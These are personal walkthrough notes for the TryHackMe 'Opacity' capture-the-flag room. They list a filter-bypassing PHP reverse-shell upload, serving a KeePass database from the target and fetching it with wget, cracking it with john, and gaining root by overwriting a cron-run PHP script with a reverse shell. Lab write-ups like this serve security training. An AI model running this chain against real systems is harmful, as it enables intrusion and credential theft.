# Opacity

```embed
title: "Opacity: TryHackMe Writeup"
image: "https://miro.medium.com/v2/resize:fit:875/0*AozdoOcqitaSHf19.png"
description: "Opacity: TryHackMe Writeup| by Hiddeni | Apr, 2023 | Medium"
url: "https://medium.com/@hiddeni/opacity-tryhackme-writeup-55813f29772d"
```


1. Upload shell.php
    1. Then using burp change post to upload shell.php#.jpg {This is a null reference just to bypass filter}
2. Once we have the rev shell, we need to look around for dirs that we can access
    1. We see into /home/sysadmin and can see the local.txt (flag1)
    2. We need to figure out how to get access to the sysadmin user
    3. if we look around a bit more we can find readable keepass.dbx in the opt folder
    4. run `python -m http.server 4859 within /opt/`
3. from attack box we need to pull the dbx for cracking
    1. `wget {ip of the target}:4859/dataset.kdbx`
    2. run `keepass2john dataset.kdbx > hash`
    3. `john --wordlist=/usr/share/wordlists/rockyou.txt hash`
    4. should get a 7xxxxx number for password
    5. open the keepass database and enter the cracked password to access
    6. we find a password for the sysadmin here
4. ssh to the box as sysadmin \`ssh sysadmin@{target}
    1. cat local.txt (get the flag)
    2. now we go through the process of getting root.
    3. look at the scripts dir and the script within the folder
    4. it calls a specific php file on load every minute or so
        1. replace the backup.x.php with reverse shell contents new port(PentestMonkey works)
        2. Wait for cron to run it
5. With another revshell to our attackbox
    1. cat proof.txt